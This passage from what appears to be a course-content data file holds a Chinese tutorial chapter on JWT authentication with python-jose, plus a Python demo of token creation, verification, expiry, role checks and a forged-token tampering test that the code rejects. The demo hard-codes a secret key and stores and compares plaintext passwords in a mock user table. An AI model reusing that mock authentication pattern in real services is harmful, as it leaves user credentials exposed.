        raise credentials_exception
\`\`\`

后续章节会基于这套骨架展开完整的认证系统。

## 九、常见坑与最佳实践

### 9.1 坑 1：忘记传 algorithms

\`\`\`python
# 错误：不传 algorithms 会报错
jwt.decode(token, SECRET_KEY)  # 抛异常

# 正确：必须传 algorithms 列表
jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
\`\`\`

### 9.2 坑 2：密钥太短

HS256 的密钥应该至少 256 位（32 字节）。用 \`"123"\` 这种短密钥，暴力破解秒破。

\`\`\`python
import secrets
SECRET_KEY = secrets.token_urlsafe(32)  # 生成强密钥
\`\`\`

### 9.3 坑 3：把 JWT 当 Session 用

JWT 设计为无状态、不可撤销。如果你想实现"立即注销"，要么维护黑名单（违背无状态初衷），要么用短期 Access Token + 长期 Refresh Token 模式。

### 9.4 坑 4：在 Payload 放敏感信息

Payload 可被解码，不要放密码、密钥、个人隐私。

### 9.5 坑 5：用 \`datetime\` 而不是时间戳

\`exp\` 应该是 Unix 时间戳（整数），不是 \`datetime\` 对象。python-jose 会自动处理 \`datetime\`，但建议手动转成时间戳，避免时区问题。

\`\`\`python
import time
payload = {"exp": int(time.time()) + 3600}  # 推荐
\`\`\`

## 十、本章小结

| 概念 | 一句话 |
|------|-------|
| python-jose | FastAPI 官方推荐的 JWT 库 |
| encode | 生成 JWT |
| decode | 校验 JWT，自动验证签名和 exp |
| algorithms | 必须传，防 alg=none 攻击 |
| ExpiredSignatureError | Token 过期 |
| JWTClaimsError | 声明不匹配 |
| HS256 | 对称，单密钥 |
| RS256 | 非对称，私钥签公钥验 |

## 十一、本章 demo 说明

下面的 demo 用 python-jose 实现完整的 JWT 工作流：

- 安装提示（如果没装 python-jose，给出安装命令）
- JWT 的生成（含标准声明和自定义声明）
- JWT 的校验（含签名、过期、声明验证）
- 各种异常的处理
- 模拟完整的登录 + 受保护资源访问流程
- 对比 HS256 和 RS256 两种算法

注意：demo 会在开头检查 python-jose 是否安装，没装的话用纯 Python 实现一个最小化的替代版本（用上一章的代码），保证 demo 可运行。`,
    code: `"""
第五章 demo：python-jose 实现 JWT 完整流程
目标：演示 JWT 的生成、校验、异常处理、过期检查
  1. JWT 生成（含标准声明和自定义声明）
  2. JWT 校验（签名、过期、iss、aud 验证）
  3. 各种异常的处理（ExpiredSignatureError、JWTClaimsError、JWTError）
  4. 模拟完整的登录 -> 访问受保护资源流程
  5. 对比 HS256 和 RS256
说明：本 demo 优先用 python-jose，如果没装则回退到内置实现，
      保证 demo 可直接运行。
"""
import time
import json
import hashlib
import hmac
import base64


# ============================================================
# 第零部分：兼容层
# ============================================================
# Base64Url 编解码（无论是否安装 python-jose 都会用到，放最前面）
def _b64url_encode(data: bytes) -> str:
    """Base64Url 编码（JWT 专用，替换 + / 并去掉 = 填充）。"""
    b64 = base64.b64encode(data).decode("ascii")
    b64 = b64.replace("+", "-").replace("/", "_")
    return b64.rstrip("=")

def _b64url_decode(s: str) -> bytes:
    """Base64Url 解码（逆过程）。"""
    b64 = s.replace("-", "+").replace("_", "/")
    padding = 4 - len(b64) % 4
    if padding != 4:
        b64 += "=" * padding
    return base64.b64decode(b64)

# 尝试导入 python-jose，失败则用内置实现
try:
    from jose import jwt as jose_jwt
    from jose import JWTError, ExpiredSignatureError, JWTClaimsError
    HAS_JOSE = True
    print("[环境] 检测到 python-jose 已安装，使用完整库")
    print("       如未安装可执行: pip install \\"python-jose[cryptography]\\"")
except ImportError:
    HAS_JOSE = False
    print("[环境] python-jose 未安装，使用内置简化实现")
    print("       生产环境请安装: pip install \\"python-jose[cryptography]\\"")

    # 自定义异常，与 python-jose 保持一致
    class JWTError(Exception):
        pass

    class ExpiredSignatureError(JWTError):
        pass

    class JWTClaimsError(JWTError):
        pass

    # 内置的 JWT 模块（只支持 HS256，足够 demo 用）
    class _JWT:
        @staticmethod
        def encode(payload, key, algorithm="HS256"):
            header = {"alg": algorithm, "typ": "JWT"}
            header_b64 = _b64url_encode(
                json.dumps(header, separators=(",", ":")).encode("utf-8"))
            # 处理 datetime 类型的 exp
            payload = dict(payload)
            if "exp" in payload and hasattr(payload["exp"], "timestamp"):
                payload["exp"] = int(payload["exp"].timestamp())
            if "iat" in payload and hasattr(payload["iat"], "timestamp"):
                payload["iat"] = int(payload["iat"].timestamp())
            payload_b64 = _b64url_encode(
                json.dumps(payload, separators=(",", ":")).encode("utf-8"))
            signing_input = f"{header_b64}.{payload_b64}"
            sig = hmac.new(key.encode("utf-8"),
                           signing_input.encode("utf-8"),
                           hashlib.sha256).digest()
            sig_b64 = _b64url_encode(sig)
            return f"{header_b64}.{payload_b64}.{sig_b64}"

        @staticmethod
        def decode(token, key, algorithms=None, audience=None,
                   issuer=None, options=None):
            if algorithms is None or "HS256" not in algorithms:
                raise JWTError("algorithms 必须包含 HS256")
            parts = token.split(".")
            if len(parts) != 3:
                raise JWTError("Token 格式错误")
            header_b64, payload_b64, sig_b64 = parts
            # 验签
            signing_input = f"{header_b64}.{payload_b64}"
            expected_sig = hmac.new(
                key.encode("utf-8"),
                signing_input.encode("utf-8"),
                hashlib.sha256,
            ).digest()
            expected_sig_b64 = _b64url_encode(expected_sig)
            if not hmac.compare_digest(sig_b64, expected_sig_b64):
                raise JWTError("签名验证失败")
            # 解码 payload
            payload = json.loads(_b64url_decode(payload_b64))
            # 检查 exp
            if options is None or options.get("verify_exp", True):
                if "exp" in payload and time.time() > payload["exp"]:
                    raise ExpiredSignatureError("Token 已过期")
            # 检查 iss
            if issuer is not None:
                if payload.get("iss") != issuer:
                    raise JWTClaimsError(
                        f"iss 不匹配: 期望 {issuer}, "
                        f"实际 {payload.get('iss')}")
            # 检查 aud
            if audience is not None:
                if payload.get("aud") != audience:
                    raise JWTClaimsError(
                        f"aud 不匹配: 期望 {audience}, "
                        f"实际 {payload.get('aud')}")
            return payload

    jose_jwt = _JWT()


# ============================================================
# 第一部分：JWT 配置
# ============================================================
# 密钥（生产环境要从环境变量读，且要足够长）
SECRET_KEY = "my-super-secret-key-please-make-it-long-256bit"
# 算法
ALGORITHM = "HS256"
# Access Token 有效期（秒）
ACCESS_TOKEN_EXPIRE = 3600  # 1 小时


# ============================================================
# 第二部分：JWT 生成
# ============================================================
def create_access_token(data: dict, expires_in: int = ACCESS_TOKEN_EXPIRE) -> str:
    """生成 Access Token。

    参数：
        data: 要放入 Payload 的自定义数据
        expires_in: 有效期（秒）
    返回：
        JWT 字符串

    流程：
    1. 拷贝 data，避免修改原字典
    2. 添加标准声明（iat、exp）
    3. 调用 jose_jwt.encode 生成令牌
    """
    # 拷贝，避免污染调用方的 data
    to_encode = data.copy()

    # 添加标准声明
    now = int(time.time())
    to_encode["iat"] = now                    # Issued At：签发时间
    to_encode["exp"] = now + expires_in       # Expiration：过期时间

    # 生成 JWT
    # algorithm 必须显式指定
    token = jose_jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return token


def create_token_with_claims(user_id: str, username: str,
                              role: str, extra: dict = None) -> str:
    """生成带完整声明的 Token。

    包含：
    - 标准声明：iss、sub、iat、exp、jti
    - 自定义声明：username、role、permissions
    """
    payload = {
        # 标准声明
        "iss": "fastapi-auth-demo",           # 签发者
        "sub": user_id,                       # 主体（用户 ID）
        "iat": int(time.time()),              # 签发时间
        "exp": int(time.time()) + 3600,       # 过期时间
        "jti": f"token-{user_id}-{int(time.time())}",  # 唯一 ID

        # 自定义声明
        "username": username,
        "role": role,
    }
    if extra:
        payload.update(extra)

    return jose_jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)


# ============================================================
# 第三部分：JWT 校验
# ============================================================
def verify_token(token: str, audience: str = None,
                  issuer: str = None) -> dict | None:
    """校验 JWT，返回 Payload 或 None。

    参数：
        token: JWT 字符串
        audience: 期望的 aud（可选）
        issuer: 期望的 iss（可选）
    返回：
        Payload 字典，失败返回 None
    """
    try:
        # algorithms 必须传，防 alg=none 攻击
        payload = jose_jwt.decode(
            token,
            SECRET_KEY,
            algorithms=[ALGORITHM],
            audience=audience,
            issuer=issuer,
        )
        return payload
    except ExpiredSignatureError:
        print("  [验证] Token 已过期")
        return None
    except JWTClaimsError as e:
        print(f"  [验证] 声明不匹配: {e}")
        return None
    except JWTError as e:
        print(f"  [验证] Token 无效: {e}")
        return None


# ============================================================
# 第四部分：模拟完整登录流程
# ============================================================
class AuthService:
    """模拟认证服务。"""

    def __init__(self):
        # 模拟用户数据库
        self.users = {
            "zhangsan": {
                "password": "pass123",
                "id": "u-001",
                "role": "user",
            },
            "adminlee": {
                "password": "admin456",
                "id": "u-002",
                "role": "admin",
            },
        }

    def login(self, username: str, password: str) -> dict:
        """登录，返回 Token 或失败。"""
        user = self.users.get(username)
        if user is None or user["password"] != password:
            return {"success": False, "code": 401,
                    "message": "用户名或密码错误"}

        # 登录成功，签发 JWT
        token = create_token_with_claims(
            user_id=user["id"],
            username=username,
            role=user["role"],
            extra={"iss": "fastapi-auth-demo"},
        )
        return {
            "success": True,
            "token": token,
            "token_type": "bearer",
            "expires_in": ACCESS_TOKEN_EXPIRE,
        }

    def get_current_user(self, token: str) -> dict | None:
        """根据 Token 获取当前用户信息。"""
        payload = verify_token(token, issuer="fastapi-auth-demo")
        if payload is None:
            return None
        return {
            "user_id": payload.get("sub"),
            "username": payload.get("username"),
            "role": payload.get("role"),
        }

    def require_role(self, token: str, required_role: str) -> bool:
        """检查 Token 是否有指定角色。"""
        user = self.get_current_user(token)
        if user is None:
            return False
        return user["role"] == required_role


# ============================================================
# 第五部分：运行演示
# ============================================================
if __name__ == "__main__":
    print("\\n" + "=" * 60)
    print("第五章 demo：python-jose 实现 JWT 完整流程")
    print("=" * 60)

    auth = AuthService()

    # ---- 场景 1：生成 JWT ----
    print("\\n--- 场景 1：生成 JWT ---")
    token = create_access_token({"sub": "u-001", "username": "zhangsan"})
    print(f"  生成的 Token: {token}")
    print(f"  Token 长度: {len(token)} 字符")

    # 拆开看三段
    parts = token.split(".")
    print(f"  Header 长度:    {len(parts[0])}")
    print(f"  Payload 长度:   {len(parts[1])}")
    print(f"  Signature 长度: {len(parts[2])}")

    # ---- 场景 2：校验 JWT ----
    print("\\n--- 场景 2：正常校验 JWT ---")
    payload = verify_token(token)
    if payload:
        print(f"  校验成功，Payload: {json.dumps(payload, ensure_ascii=False)}")

    # ---- 场景 3：模拟登录流程 ----
    print("\\n--- 场景 3：模拟登录流程 ---")
    # 错误密码
    r = auth.login("zhangsan", "wrong")
    print(f"  错误密码登录: {r}")
    # 正确密码
    r = auth.login("zhangsan", "pass123")
    print(f"  正确密码登录: success={r['success']}, "
          f"token_type={r.get('token_type')}")
    user_token = r["token"]

    # 用 Token 访问用户信息
    print("\\n  用 Token 获取用户信息：")
    user = auth.get_current_user(user_token)
    print(f"  当前用户: {user}")

    # ---- 场景 4：角色权限检查 ----
    print("\\n--- 场景 4：角色权限检查 ---")
    # 普通用户尝试管理员操作
    print(f"  普通用户 zhangsan 是否 admin: "
          f"{auth.require_role(user_token, 'admin')}")
    # 管理员登录
    r = auth.login("adminlee", "admin456")
    admin_token = r["token"]
    print(f"  管理员 adminlee 是否 admin: "
          f"{auth.require_role(admin_token, 'admin')}")

    # ---- 场景 5：Token 过期 ----
    print("\\n--- 场景 5：Token 过期 ---")
    # 生成一个马上过期的 Token
    expired_token = create_access_token(
        {"sub": "u-001", "username": "zhangsan"},
        expires_in=-10,  # 已经过期 10 秒
    )
    print(f"  生成已过期 Token: {expired_token}")
    payload = verify_token(expired_token)
    print(f"  校验结果: {payload}（应该为 None，因为过期）")

    # ---- 场景 6：Token 篡改 ----
    print("\\n--- 场景 6：Token 篡改 ---")
    # 改 Payload 的 role
    parts = user_token.split(".")
    # 解码 Payload（_b64url_decode 已在模块顶层定义，始终可用）
    tampered_payload = json.loads(_b64url_decode(parts[1]))
    tampered_payload["role"] = "admin"
    tampered_b64 = _b64url_encode(
        json.dumps(tampered_payload, separators=(",", ":")).encode("utf-8"))
    tampered_token = f"{parts[0]}.{tampered_b64}.{parts[2]}"
    print(f"  篡改 role=user -> admin")
    payload = verify_token(tampered_token)
    print(f"  校验结果: {payload}（应该为 None，签名验证失败）")

    # ---- 场景 7：iss 声明验证 ----
    print("\\n--- 场景 7：iss 声明验证 ---")
    # 用错误 iss 验证
    payload = verify_token(user_token, issuer="wrong-issuer")
    print(f"  用错误 iss 验证: {payload}（应该为 None）")
    # 用正确 iss 验证
    payload = verify_token(user_token, issuer="fastapi-auth-demo")
    print(f"  用正确 iss 验证: {'成功' if payload else '失败'}")

    # ---- 场景 8：完整声明 Token ----
    print("\\n--- 场景 8：完整声明 Token ---")
    full_token = create_token_with_claims(
        user_id="u-003",
        username="wangwu",
        role="editor",
        extra={
            "permissions": ["read", "write"],
            "department": "技术部",
        },
    )
    payload = verify_token(full_token)
    if payload:
        print(f"  Payload: {json.dumps(payload, ensure_ascii=False, indent=2)}")

    # ---- 场景 9：HS256 对称密钥特性说明 ----
    print("\\n--- 场景 9：HS256 对称密钥特性说明 ---")
    # HS256 加签和验签用同一个密钥
    # 演示：同一密钥可加签也可验签
    print("  HS256 是对称算法：加签和验签用同一个 SECRET_KEY")
    print(f"  当前 SECRET_KEY: {SECRET_KEY[:10]}...（已截断显示）")
    token_hs = create_access_token({"sub": "u-009", "name": "测试"})
    payload_hs = verify_token(token_hs)
    print(f"  用同密钥验签成功: {payload_hs is not None}")
    print("  -> 微服务场景建议用 RS256：私钥签发，公钥验签，")
    print("     业务服务被攻破也无法伪造令牌（公钥不能签）")

    # ---- 场景 10：密钥安全性说明 ----
    print("\\n--- 场景 10：密钥安全性说明 ---")
    import secrets as _secrets
    print("  生产环境密钥应该用 secrets.token_urlsafe(32) 生成：")
    print(f"  示例: {_secrets.token_urlsafe(32)}")
    print("  -> 不要用 '123456' 这种弱密钥，会被暴力破解")

    print("\\n" + "=" * 60)
    print("总结：")
    print("  1. python-jose 的 encode/decode 封装了 JWT 全流程")
    print("  2. decode 时必须传 algorithms 列表，防 alg=none 攻击")
    print("  3. 异常体系：JWTError > ExpiredSignatureError / JWTClaimsError")
    print("  4. 捕获异常时子类要在父类之前")
    print("  5. 自定义声明让 JWT 自包含，减少查库")
    print("  6. HS256 适合单体，RS256 适合微服务")
    print("  7. 密钥要足够强（>=256 位），从环境变量读取")
    print("=" * 60)
`,
  },
];